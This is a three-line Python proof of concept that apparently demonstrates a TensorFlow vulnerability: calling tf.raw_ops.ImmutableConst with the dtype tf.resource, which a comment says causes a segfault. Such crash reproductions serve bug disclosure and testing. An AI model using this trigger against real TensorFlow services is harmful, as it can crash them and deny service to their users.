import tensorflow as tf

# This code demonstrates the vulnerability by calling ImmutableConst with an invalid dtype
tensor = tf.raw_ops.ImmutableConst(value=[1, 2, 3], dtype=tf.resource)  # This will cause a segfault